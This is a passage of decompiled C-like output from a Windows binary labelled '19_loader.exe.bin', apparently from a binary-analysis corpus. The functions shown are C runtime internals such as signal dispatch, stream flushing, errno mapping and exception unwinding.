  code *pcVar2;
  bool bVar3;
  
  pcVar2 = (code *)FUN_140018570();
  bVar3 = false;
  if (pcVar2 != (code *)0x0) {
    iVar1 = (*pcVar2)(param_1);
    bVar3 = iVar1 != 0;
  }
  return bVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18560 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018560 rva=0x18560 */

void FUN_140018560(undefined8 param_1)

{
  DAT_1400e1170 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18570 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018570 rva=0x18570 */

ulonglong FUN_140018570(void)

{
  byte bVar1;
  ulonglong uVar2;
  
  FUN_140016ab4(0);
  bVar1 = (byte)DAT_1400dfc40 & 0x3f;
  uVar2 = DAT_1400e1170 ^ DAT_1400dfc40;
  FUN_140016ad0(0);
  return uVar2 >> bVar1 | uVar2 << 0x40 - bVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x185b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400185b0 rva=0x185b0 */

ulonglong FUN_1400185b0(ulonglong param_1)

{
  byte bVar1;
  byte bVar2;
  ulonglong uVar3;
  
  FUN_140016ab4(0);
  bVar2 = (byte)DAT_1400dfc40 & 0x3f;
  uVar3 = DAT_1400dfc40 ^ DAT_1400e1170;
  bVar1 = 0x40 - bVar2 & 0x3f;
  DAT_1400e1170 = (param_1 >> bVar1 | param_1 << 0x40 - bVar1) ^ DAT_1400dfc40;
  FUN_140016ad0(0);
  return uVar3 >> bVar2 | uVar3 << 0x40 - bVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1861c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001861c rva=0x1861c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14001861c(undefined8 param_1)

{
  _DAT_1400e1178 = param_1;
  _DAT_1400e1180 = param_1;
  DAT_1400e1188 = param_1;
  _DAT_1400e1190 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1863c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001863c rva=0x1863c */

void FUN_14001863c(void)

{
  undefined1 local_res8 [8];
  int local_res10 [2];
  int local_res18 [4];
  
  local_res10[0] = 3;
  local_res18[0] = 3;
  FUN_1400188c8(local_res8,local_res18,local_res8,local_res10);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1866c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001866c rva=0x1866c */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_14001866c(uint param_1)

{
  bool bVar1;
  longlong *plVar2;
  undefined8 *puVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  byte bVar7;
  code *pcVar8;
  ulonglong *puVar9;
  undefined4 local_res10;
  
  plVar2 = (longlong *)0x0;
  local_res10 = 0;
  bVar1 = true;
  if (param_1 == 2) {
LAB_1400186c3:
    if (param_1 == 2) {
      puVar9 = (ulonglong *)&DAT_1400e1178;
    }
    else if (param_1 == 6) {
LAB_140018765:
      puVar9 = &DAT_1400e1188;
    }
    else if (param_1 == 0xf) {
      puVar9 = (ulonglong *)&DAT_1400e1190;
    }
    else if (param_1 == 0x15) {
      puVar9 = (ulonglong *)&DAT_1400e1180;
    }
    else {
      if (param_1 == 0x16) goto LAB_140018765;
      puVar9 = (ulonglong *)0x0;
    }
  }
  else {
    if (param_1 != 4) {
      if (param_1 != 6) {
        if ((param_1 == 8) || (param_1 == 0xb)) goto LAB_1400186f3;
        if ((param_1 != 0xf) && ((param_1 != 0x15 && (param_1 != 0x16)))) goto LAB_140018745;
      }
      goto LAB_1400186c3;
    }
LAB_1400186f3:
    plVar2 = FUN_140016c20();
    if (plVar2 == (longlong *)0x0) {
      return 0xffffffff;
    }
    lVar6 = *plVar2;
    lVar4 = lVar6 + 0xc0;
    for (; lVar6 != lVar4; lVar6 = lVar6 + 0x10) {
      if (*(uint *)(lVar6 + 4) == param_1) goto LAB_140018740;
    }
    lVar6 = 0;
LAB_140018740:
    if (lVar6 == 0) {
LAB_140018745:
      puVar3 = FUN_140018dec();
      *(undefined4 *)puVar3 = 0x16;
      FUN_1400180c4();
      return 0xffffffff;
    }
    puVar9 = (ulonglong *)(lVar6 + 8);
    bVar1 = false;
  }
  lVar6 = 0;
  if (bVar1) {
    FUN_140016ab4(3);
  }
  pcVar8 = (code *)*puVar9;
  if (bVar1) {
    bVar7 = (byte)DAT_1400dfc40 & 0x3f;
    pcVar8 = (code *)(((ulonglong)pcVar8 ^ DAT_1400dfc40) >> bVar7 |
                     ((ulonglong)pcVar8 ^ DAT_1400dfc40) << 0x40 - bVar7);
  }
  if (pcVar8 == (code *)0x1) goto LAB_14001884e;
  if (pcVar8 == (code *)0x0) {
    if (bVar1) {
      FUN_140016ad0(3);
    }
                    /* WARNING: Subroutine does not return */
    FUN_140014d94(3);
  }
  if ((param_1 < 0xc) && ((0x910U >> (param_1 & 0x1f) & 1) != 0)) {
    lVar6 = plVar2[1];
    plVar2[1] = 0;
    if (param_1 == 8) {
      lVar4 = FUN_140016bc0();
      local_res10 = *(undefined4 *)(lVar4 + 0x10);
      lVar4 = FUN_140016bc0();
      *(undefined4 *)(lVar4 + 0x10) = 0x8c;
      goto LAB_140018806;
    }
  }
  else {
LAB_140018806:
    if (param_1 == 8) {
      lVar4 = *plVar2;
      for (lVar5 = lVar4 + 0x30; lVar5 != lVar4 + 0xc0; lVar5 = lVar5 + 0x10) {
        *(undefined8 *)(lVar5 + 8) = 0;
      }
      goto LAB_14001884e;
    }
  }
  *puVar9 = DAT_1400dfc40;
LAB_14001884e:
  if (bVar1) {
    FUN_140016ad0(3);
  }
  if (pcVar8 != (code *)0x1) {
    if (param_1 == 8) {
      lVar4 = FUN_140016bc0();
      (*pcVar8)(8,*(undefined4 *)(lVar4 + 0x10));
    }
    else {
      (*pcVar8)(param_1);
    }
    if (((param_1 < 0xc) && ((0x910U >> (param_1 & 0x1f) & 1) != 0)) &&
       (plVar2[1] = lVar6, param_1 == 8)) {
      lVar6 = FUN_140016bc0();
      *(undefined4 *)(lVar6 + 0x10) = local_res10;
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x188c8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400188c8 rva=0x188c8 */

ulonglong FUN_1400188c8(undefined8 param_1,int *param_2,undefined8 param_3,int *param_4)

{
  byte bVar1;
  ulonglong uVar2;
  
  FUN_140016ab4(*param_2);
  bVar1 = (byte)DAT_1400dfc40 & 0x3f;
  uVar2 = DAT_1400e1188 ^ DAT_1400dfc40;
  FUN_140016ad0(*param_4);
  return uVar2 >> bVar1 | uVar2 << 0x40 - bVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18910 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018910 rva=0x18910 */

undefined4 thunk_FUN_140018a78(char param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_140018a78('\x01');
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18918 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018918 rva=0x18918 */

undefined4 FUN_140018918(int *param_1)

{
  undefined4 uVar1;
  uint uVar2;
  undefined8 uVar3;
  longlong lVar4;
  longlong local_48 [2];
  undefined1 local_38;
  undefined *local_30;
  undefined *puStack_28;
  char local_20;
  undefined4 local_1c;
  char local_18;
  undefined4 local_14;
  char local_10;
  
  local_48[0] = 0;
  local_20 = DAT_1400e07f8 == 0;
  local_38 = 0;
  local_18 = '\0';
  local_10 = '\0';
  if ((bool)local_20) {
    local_30 = PTR_PTR_1400e0358;
    puStack_28 = PTR_DAT_1400e0360;
  }
  if (param_1 == (int *)0x0) {
    uVar1 = FUN_140018a78('\0');
    goto LAB_14001899d;
  }
  uVar3 = FUN_1400189ec(param_1,local_48);
  if ((int)uVar3 == 0) {
    if (((uint)param_1[5] >> 0xb & 1) != 0) {
      uVar2 = FUN_14001d2b0((longlong)param_1);
      uVar3 = FUN_14001d190(uVar2);
      if ((int)uVar3 != 0) goto LAB_140018978;
    }
    uVar1 = 0;
  }
  else {
LAB_140018978:
    uVar1 = 0xffffffff;
  }
LAB_14001899d:
  if (local_20 == '\x02') {
    *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd;
  }
  if (local_18 != '\0') {
    lVar4 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar4 + 0x20) = local_1c;
  }
  if (local_10 != '\0') {
    lVar4 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar4 + 0x24) = local_14;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x189ec | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400189ec rva=0x189ec */

undefined8 FUN_1400189ec(int *param_1,longlong *param_2)

{
  byte *pbVar1;
  uint uVar2;
  uint uVar3;
  
  if ((((byte)param_1[5] & 3) == 2) && ((param_1[5] & 0xc0U) != 0)) {
    uVar3 = *param_1 - param_1[2];
    param_1[4] = 0;
    pbVar1 = *(byte **)(param_1 + 2);
    *(byte **)param_1 = pbVar1;
    if (0 < (int)uVar3) {
      uVar2 = FUN_14001d2b0((longlong)param_1);
      uVar2 = FUN_14001d608(uVar2,pbVar1,uVar3,param_2);
      if (uVar3 != uVar2) {
        LOCK();
        param_1[5] = param_1[5] | 0x10;
        UNLOCK();
        return 0xffffffff;
      }
      if (((uint)param_1[5] >> 2 & 1) != 0) {
        LOCK();
        param_1[5] = param_1[5] & 0xfffffffd;
        UNLOCK();
      }
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18a78 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018a78 rva=0x18a78 */

undefined4 FUN_140018a78(char param_1)

{
  char local_res8 [8];
  undefined1 local_res10 [8];
  undefined4 local_res18 [2];
  undefined4 local_res20 [2];
  int local_28 [2];
  undefined4 *local_20;
  char *local_18;
  undefined4 *local_10;
  
  local_res20[0] = 0;
  local_20 = local_res20;
  local_res18[0] = 0;
  local_18 = local_res8;
  local_10 = local_res18;
  local_28[0] = 8;
  local_28[1] = 8;
  local_res8[0] = param_1;
  FUN_140018b74(local_res10,local_28 + 1,&local_20,local_28);
  if (local_res8[0] != '\0') {
    local_res18[0] = local_res20[0];
  }
  return local_res18[0];
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18ad8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018ad8 rva=0x18ad8 */

void FUN_140018ad8(undefined8 param_1,longlong *param_2,undefined8 *param_3,longlong *param_4)

{
  uint uVar1;
  int iVar2;
  
  FUN_140018c58(*param_2);
  if ((*(longlong *)*param_3 != 0) &&
     (uVar1 = *(uint *)(*(longlong *)*param_3 + 0x14), (uVar1 >> 0xd & 1) != 0)) {
    if (((((byte)uVar1 & 3) == 2) && ((uVar1 & 0xc0) != 0)) || ((uVar1 >> 0xb & 1) != 0)) {
      if ((*(char *)param_3[2] != '\0') || ((*(uint *)(*(longlong *)*param_3 + 0x14) >> 1 & 1) != 0)
         ) {
        iVar2 = FUN_140018918(*(int **)*param_3);
        if (iVar2 == -1) {
          *(undefined4 *)param_3[3] = 0xffffffff;
        }
        else {
          *(int *)param_3[1] = *(int *)param_3[1] + 1;
        }
      }
    }
    else {
      *(int *)param_3[1] = *(int *)param_3[1] + 1;
    }
  }
  FUN_140018c64(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18b74 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018b74 rva=0x18b74 */

void FUN_140018b74(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  longlong *plVar1;
  uint uVar2;
  longlong *plVar3;
  undefined1 local_res10 [16];
  int *local_res20;
  longlong local_58;
  longlong local_50;
  longlong local_48;
  longlong *local_40;
  longlong *local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  
  local_res20 = param_4;
  FUN_140016ab4(*param_2);
  plVar1 = DAT_1400e11a8 + DAT_1400e11a0;
  for (plVar3 = DAT_1400e11a8; local_40 = plVar3, plVar3 != plVar1; plVar3 = plVar3 + 1) {
    local_58 = *plVar3;
    if ((local_58 != 0) && (uVar2 = *(uint *)(local_58 + 0x14), (uVar2 >> 0xd & 1) != 0)) {
      if (((((byte)uVar2 & 3) == 2) && ((uVar2 & 0xc0) != 0)) || ((uVar2 >> 0xb & 1) != 0)) {
        local_20 = param_3[2];
        local_28 = param_3[1];
        local_30 = *param_3;
        local_38 = &local_58;
        local_50 = local_58;
        local_48 = local_58;
        FUN_140018ad8(local_res10,&local_48,&local_38,&local_50);
      }
      else {
        *(int *)*param_3 = *(int *)*param_3 + 1;
      }
    }
  }
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18c58 | partial_markers_remain ===== */
/* address=140018c58 rva=0x18c58 */

void FUN_140018c58(longlong param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140018c5c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection(param_1 + 0x30);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18c64 | partial_markers_remain ===== */
/* address=140018c64 rva=0x18c64 */

void FUN_140018c64(longlong param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140018c68. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection(param_1 + 0x30);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18c70 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018c70 rva=0x18c70 */

undefined8 FUN_140018c70(void)

{
  longlong lVar1;
  longlong lVar2;
  undefined4 *puVar3;
  longlong lVar4;
  undefined *puVar5;
  
  lVar1 = 0;
  lVar4 = 3;
  if (DAT_1400e11a0 == 0) {
    DAT_1400e11a0 = 0x200;
  }
  else if (DAT_1400e11a0 < 3) {
    DAT_1400e11a0 = 3;
  }
  DAT_1400e11a8 = FUN_140019980((longlong)DAT_1400e11a0,8);
  FUN_140017fb0((LPVOID)0x0);
  if (DAT_1400e11a8 == (LPVOID)0x0) {
    DAT_1400e11a0 = 3;
    DAT_1400e11a8 = FUN_140019980(3,8);
    FUN_140017fb0((LPVOID)0x0);
    if (DAT_1400e11a8 == (LPVOID)0x0) {
      return 0xffffffff;
    }
  }
  lVar2 = 0;
  puVar3 = &DAT_1400e0388;
  puVar5 = &DAT_1400e0370;
  do {
    InitializeCriticalSectionEx((LPCRITICAL_SECTION)(puVar5 + 0x30),4000,0);
    *(undefined **)(lVar1 + (longlong)DAT_1400e11a8) = puVar5;
    if (*(longlong *)((&DAT_1400e0d40)[lVar2 >> 6] + 0x28 + (ulonglong)((uint)lVar2 & 0x3f) * 0x48)
        + 2U < 3) {
      *puVar3 = 0xfffffffe;
    }
    lVar2 = lVar2 + 1;
    puVar5 = puVar5 + 0x58;
    lVar1 = lVar1 + 8;
    puVar3 = puVar3 + 0x16;
    lVar4 = lVar4 + -1;
  } while (lVar4 != 0);
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18d90 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018d90 rva=0x18d90 */

void FUN_140018d90(char param_1)

{
  longlong lVar1;
  
  thunk_FUN_140018a78(param_1);
  FUN_14001df54();
  lVar1 = 0;
  do {
    FUN_14001e008(*(undefined8 **)(lVar1 + (longlong)DAT_1400e11a8));
    DeleteCriticalSection
              ((LPCRITICAL_SECTION)(*(longlong *)(lVar1 + (longlong)DAT_1400e11a8) + 0x30));
    lVar1 = lVar1 + 8;
  } while (lVar1 != 0x18);
  FUN_140017fb0(DAT_1400e11a8);
  DAT_1400e11a8 = (LPVOID)0x0;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18dec | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018dec rva=0x18dec */

undefined8 * FUN_140018dec(void)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = FUN_140016c20();
  puVar2 = puVar1 + 4;
  if (puVar1 == (undefined8 *)0x0) {
    puVar2 = (undefined8 *)&DAT_1400e0478;
  }
  return puVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18e10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018e10 rva=0x18e10 */

undefined * FUN_140018e10(void)

{
  undefined8 *puVar1;
  undefined *puVar2;
  
  puVar1 = FUN_140016c20();
  puVar2 = (undefined *)((longlong)puVar1 + 0x24);
  if (puVar1 == (undefined8 *)0x0) {
    puVar2 = &DAT_1400e047c;
  }
  return puVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18e34 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018e34 rva=0x18e34 */

void FUN_140018e34(uint param_1)

{
  uint uVar1;
  uint *puVar2;
  
  puVar2 = (uint *)FUN_140018e10();
  *puVar2 = param_1;
  uVar1 = FUN_140018e5c(param_1);
  puVar2 = (uint *)FUN_140018dec();
  *puVar2 = uVar1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18e5c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018e5c rva=0x18e5c */

uint FUN_140018e5c(uint param_1)

{
  longlong lVar1;
  uint uVar2;
  ulonglong uVar3;
  uint *puVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  
  if (param_1 != 0) {
    if (param_1 < 0xe) {
      return *(uint *)(&DAT_14008c3a4 + (ulonglong)(param_1 - 1) * 8);
    }
    if (param_1 < 0x719) {
      uVar5 = 0x2d;
      uVar9 = 0;
      uVar7 = 0x2c;
      do {
        uVar8 = uVar5 >> 1;
        if (uVar8 == 0) {
          if (uVar5 != 0) {
            puVar4 = (uint *)(&DAT_14008c3a0 + uVar9 * 8);
            if (param_1 != *puVar4) {
              puVar4 = (uint *)0x0;
            }
LAB_140018efd:
            if (puVar4 != (uint *)0x0) {
              return puVar4[1];
            }
          }
          break;
        }
        uVar6 = uVar8 - 1;
        if ((uVar5 & 1) != 0) {
          uVar6 = uVar8;
        }
        lVar1 = uVar6 + uVar9;
        puVar4 = (uint *)(&DAT_14008c3a0 + lVar1 * 8);
        if (param_1 == *puVar4) goto LAB_140018efd;
        uVar3 = lVar1 - 1;
        uVar5 = uVar6;
        if (*puVar4 <= param_1) {
          uVar9 = lVar1 + 1;
          uVar3 = uVar7;
          uVar5 = uVar8;
        }
        uVar7 = uVar3;
      } while (uVar9 <= uVar3);
    }
  }
  if (param_1 - 0x13 < 0x12) {
    uVar2 = 0xd;
  }
  else {
    uVar2 = 0x16;
    if (param_1 - 0xbc < 0xf) {
      uVar2 = 8;
    }
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18f2c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018f2c rva=0x18f2c */

void FUN_140018f2c(uint param_1,longlong param_2)

{
  uint uVar1;
  
  *(undefined1 *)(param_2 + 0x38) = 1;
  *(uint *)(param_2 + 0x34) = param_1;
  uVar1 = FUN_140018e5c(param_1);
  *(uint *)(param_2 + 0x2c) = uVar1;
  *(undefined1 *)(param_2 + 0x30) = 1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18f50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018f50 rva=0x18f50 */

ulonglong FUN_140018f50(void)

{
  return (ulonglong)(uint3)((uint)*(undefined4 *)((longlong)ProcessEnvironmentBlock + 0xbc) >> 8) &
         0xffffffffffffff01;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18f6c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018f6c rva=0x18f6c */

uint FUN_140018f6c(void)

{
  return *(uint *)(*(longlong *)((longlong)ProcessEnvironmentBlock + 0x20) + 8) >> 0x1f;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18f84 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018f84 rva=0x18f84 */

bool FUN_140018f84(void)

{
  uint uVar1;
  int local_res8 [8];
  
  local_res8[0] = 0;
  uVar1 = FUN_140018f6c();
  if ((char)uVar1 == '\0') {
    FUN_1400167a8(local_res8);
  }
  return local_res8[0] != 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18fc0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018fc0 rva=0x18fc0 */

bool FUN_140018fc0(ulonglong *param_1,longlong param_2)

{
  int iVar1;
  PVOID pvVar2;
  longlong lVar3;
  uint uVar4;
  ulonglong uVar5;
  
  iVar1 = FUN_14001e0b0(param_2,param_1);
  uVar4 = *(uint *)(param_2 + 0xc);
  uVar5 = (ulonglong)uVar4;
  do {
    if (uVar4 == 0) {
      lVar3 = 0;
      break;
    }
    uVar4 = (int)uVar5 - 1;
    uVar5 = (ulonglong)uVar4;
    pvVar2 = FUN_1400161f0();
    lVar3 = (longlong)*(int *)(param_2 + 0x10) +
            *(longlong *)((longlong)pvVar2 + 0x60) + uVar5 * 0x14;
  } while ((iVar1 <= *(int *)(lVar3 + 4)) || (*(int *)(lVar3 + 8) < iVar1));
  return lVar3 != 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19030 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019030 rva=0x19030 */

void FUN_140019030(longlong *param_1,ulonglong *param_2,longlong param_3)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  PRUNTIME_FUNCTION p_Var4;
  ulonglong uVar5;
  PVOID pvVar6;
  longlong lVar7;
  ulonglong uVar8;
  uint uVar9;
  int iVar10;
  longlong lVar11;
  longlong local_res8;
  ulonglong local_res18 [2];
  
  uVar9 = *(uint *)(param_3 + 0xc);
  uVar8 = (ulonglong)uVar9;
  iVar2 = FUN_14001e0b0(param_3,param_2);
  local_res8 = *param_1;
  do {
    do {
      if (uVar9 == 0) goto LAB_1400190f5;
      uVar9 = (int)uVar8 - 1;
      uVar8 = (ulonglong)uVar9;
      lVar7 = (longlong)*(int *)(param_3 + 0x10) + uVar8 * 0x14 + param_2[1];
    } while ((iVar2 <= *(int *)(lVar7 + 4)) || (*(int *)(lVar7 + 8) < iVar2));
    p_Var4 = RtlLookupFunctionEntry(*param_2,local_res18,(PUNWIND_HISTORY_TABLE)0x0);
    lVar11 = (longlong)*(int *)(lVar7 + 0x10) + local_res18[0];
    uVar1 = *(uint *)(lVar7 + 0xc);
    uVar5 = 0;
    if (uVar1 != 0) {
      do {
        if ((longlong)*(int *)(lVar11 + 0xc + uVar5 * 0x14) == (ulonglong)p_Var4->BeginAddress)
        goto LAB_1400190e0;
        uVar3 = (int)uVar5 + 1;
        uVar5 = (ulonglong)uVar3;
      } while (uVar3 < uVar1);
    }
  } while (uVar1 <= (uint)uVar5);
LAB_1400190e0:
  local_res8 = *(longlong *)((longlong)*(int *)(lVar11 + 0x10 + uVar5 * 0x14) + *param_1);
LAB_1400190f5:
  iVar2 = FUN_14001e0b0(param_3,param_2);
  uVar9 = *(uint *)(param_3 + 0xc);
  uVar8 = (ulonglong)uVar9;
  do {
    if (uVar9 == 0) {
      iVar10 = -1;
      break;
    }
    pvVar6 = FUN_1400161f0();
    uVar9 = (int)uVar8 - 1;
    uVar8 = (ulonglong)uVar9;
    lVar7 = (longlong)*(int *)(param_3 + 0x10) + *(longlong *)((longlong)pvVar6 + 0x60);
    iVar10 = *(int *)(lVar7 + 4 + uVar8 * 0x14);
  } while ((iVar2 <= iVar10) || (*(int *)(lVar7 + 8 + uVar8 * 0x14) < iVar2));
  FUN_14001e2a0(&local_res8,param_2,param_3,iVar10);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19160 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019160 rva=0x19160 */

longlong * FUN_140019160(longlong *param_1,ulonglong *param_2,longlong param_3,longlong *param_4)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  PRUNTIME_FUNCTION p_Var4;
  ulonglong uVar5;
  longlong lVar6;
  uint uVar7;
  ulonglong uVar8;
  longlong lVar9;
  ulonglong uStackX_8;
  
  uVar7 = *(uint *)(param_3 + 0xc);
  uVar8 = (ulonglong)uVar7;
  iVar2 = FUN_14001e0b0(param_3,param_2);
  *param_4 = *param_1;
  if (uVar7 == 0) {
    return param_4;
  }
  do {
    uVar7 = (int)uVar8 - 1;
    uVar8 = (ulonglong)uVar7;
    lVar6 = (longlong)*(int *)(param_3 + 0x10) + uVar8 * 0x14 + param_2[1];
    if ((*(int *)(lVar6 + 4) < iVar2) && (iVar2 <= *(int *)(lVar6 + 8))) {
      p_Var4 = RtlLookupFunctionEntry(*param_2,&uStackX_8,(PUNWIND_HISTORY_TABLE)0x0);
      lVar9 = (longlong)*(int *)(lVar6 + 0x10) + uStackX_8;
      uVar1 = *(uint *)(lVar6 + 0xc);
      uVar5 = 0;
      if (uVar1 != 0) {
        do {
          if ((longlong)*(int *)(lVar9 + 0xc + uVar5 * 0x14) == (ulonglong)p_Var4->BeginAddress)
          goto LAB_140019210;
          uVar3 = (int)uVar5 + 1;
          uVar5 = (ulonglong)uVar3;
        } while (uVar3 < uVar1);
      }
      if ((uint)uVar5 < uVar1) {
LAB_140019210:
        *param_4 = *(longlong *)((longlong)*(int *)(lVar9 + 0x10 + uVar5 * 0x14) + *param_1);
        return param_4;
      }
    }
    if (uVar7 == 0) {
      return param_4;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1919a | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001919a rva=0x1919a */

void FUN_14001919a(void)

{
  uint uVar1;
  uint uVar2;
  PRUNTIME_FUNCTION p_Var3;
  ulonglong uVar4;
  longlong lVar5;
  longlong unaff_RBP;
  int unaff_ESI;
  uint uVar6;
  ulonglong unaff_RDI;
  longlong lVar7;
  longlong *unaff_R12;
  undefined8 *unaff_R14;
  DWORD64 *unaff_R15;
  ulonglong uStack0000000000000050;
  
  do {
    uVar6 = (int)unaff_RDI - 1;
    unaff_RDI = (ulonglong)uVar6;
    lVar5 = (longlong)*(int *)(unaff_RBP + 0x10) + unaff_RDI * 0x14 + unaff_R15[1];
    if ((*(int *)(lVar5 + 4) < unaff_ESI) && (unaff_ESI <= *(int *)(lVar5 + 8))) {
      p_Var3 = RtlLookupFunctionEntry(*unaff_R15,&uStack0000000000000050,(PUNWIND_HISTORY_TABLE)0x0)
      ;
      lVar7 = (longlong)*(int *)(lVar5 + 0x10) + uStack0000000000000050;
      uVar1 = *(uint *)(lVar5 + 0xc);
      uVar4 = 0;
      if (uVar1 != 0) {
        do {
          if ((longlong)*(int *)(lVar7 + 0xc + uVar4 * 0x14) == (ulonglong)p_Var3->BeginAddress)
          goto LAB_140019210;
          uVar2 = (int)uVar4 + 1;
          uVar4 = (ulonglong)uVar2;
        } while (uVar2 < uVar1);
      }
      if ((uint)uVar4 < uVar1) {
LAB_140019210:
        *unaff_R14 = *(undefined8 *)((longlong)*(int *)(lVar7 + 0x10 + uVar4 * 0x14) + *unaff_R12);
        return;
      }
    }
    if (uVar6 == 0) {
      return;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1923e | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001923e rva=0x1923e */

void FUN_14001923e(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19260 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019260 rva=0x19260 */

void FUN_140019260(undefined8 *param_1,ULONG_PTR param_2,ULONG_PTR param_3,ULONG_PTR param_4,
                  ULONG_PTR param_5,ULONG_PTR param_6,int param_7,undefined8 param_8,
                  undefined8 param_9,undefined8 *param_10,byte param_11)

{
  undefined1 auStackY_e8 [32];
  EXCEPTION_RECORD local_b8;
  ulonglong local_18;
  
  local_18 = DAT_1400dfc40 ^ (ulonglong)auStackY_e8;
  local_b8.ExceptionCode = 0x80000029;
  local_b8.ExceptionFlags = 1;
  local_b8.ExceptionRecord = (_EXCEPTION_RECORD *)0x0;
  local_b8.ExceptionAddress = (PVOID)0x0;
  local_b8.NumberParameters = 0xf;
  local_b8._28_4_ = 0;
  local_b8.ExceptionInformation[9] = 0;
  local_b8.ExceptionInformation[10] = 0;
  local_b8.ExceptionInformation[0xb] = 0;
  local_b8.ExceptionInformation[0xe] = 0;
  local_b8.ExceptionInformation[0xc]._0_4_ = 0;
  local_b8.ExceptionInformation[0xc]._4_4_ = 0;
  local_b8.ExceptionInformation[0xd]._0_4_ = 0;
  local_b8.ExceptionInformation[0xd]._4_4_ = 0;
  local_b8.ExceptionInformation[0] = (ULONG_PTR)FUN_14001e450;
  local_b8.ExceptionInformation[2] = param_5;
  local_b8.ExceptionInformation[3] = (ULONG_PTR)param_7;
  local_b8.ExceptionInformation[5] = param_6;
  local_b8.ExceptionInformation[7] = (ULONG_PTR)param_11;
  local_b8.ExceptionInformation[8] = 0x19930520;
  local_b8.ExceptionInformation[1] = param_4;
  local_b8.ExceptionInformation[4] = param_3;
  local_b8.ExceptionInformation[6] = param_2;
  RtlUnwindEx((PVOID)*param_1,(PVOID)*param_10,&local_b8,(PVOID)0x0,(PCONTEXT)param_10[5],
              (PUNWIND_HISTORY_TABLE)param_10[8]);
  FUN_14001a2d0(local_18 ^ (ulonglong)auStackY_e8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19390 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019390 rva=0x19390 */

undefined8 *
